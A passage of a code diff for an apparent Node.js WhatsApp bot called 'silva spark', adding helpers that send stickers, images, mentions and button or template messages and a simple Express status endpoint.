+            console.error('sendVideoAsSticker error:', e.message);
+        }
+    };
+    
+    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+        try {
+            let buffer;
+            const { writeExifImg, imageToWebp } = require('./lib/exif');
+            if (options && (options.packname || options.author)) {
+                buffer = await writeExifImg(buff, options);
+            } else {
+                buffer = await imageToWebp(buff);
+            }
+            await conn.sendMessage(
+                jid,
+                { sticker: { url: buffer }, ...options },
+                options
+            );
+        } catch (e) {
+            console.error('sendImageAsSticker error:', e.message);
+        }
+    };
+    
+    conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+
+    conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
+        try {
+            let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+            return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
+        } catch (e) {
+            console.error('sendImage error:', e.message);
+            return null;
+        }
+    }
+
+    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
+
+    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
+        try {
+            let buttonMessage = {
+                text,
+                footer,
+                buttons,
+                headerType: 2,
+                ...options
+            }
+            conn.sendMessage(jid, buttonMessage, { quoted, ...options })
+        } catch (e) {
+            console.error('sendButtonText error:', e.message);
+        }
+    }
+    
+    conn.send5ButImg = async (jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+        try {
+            let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
+            var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
+                templateMessage: {
+                    hydratedTemplate: {
+                        imageMessage: message.imageMessage,
+                        "hydratedContentText": text,
+                        "hydratedFooterText": footer,
+                        "hydratedButtons": but
+                    }
+                }
+            }), options)
+            conn.relayMessage(jid, template.message, { messageId: template.key.id })
+        } catch (e) {
+            console.error('send5ButImg error:', e.message);
+        }
+    }
+    
+    // Helper function for getSizeMedia
+    const getSizeMedia = (data) => {
+        return Buffer.byteLength(data);
     }
 
 }
 
+// ==============================
+// 🌐 EXPRESS SERVER
+// ==============================
 app.get("/", (req, res) => {
     res.send("silva spark RUNNING ✅");
 });
+
 app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+
 setTimeout(() => {
     connectToWA()
 }, 4000);
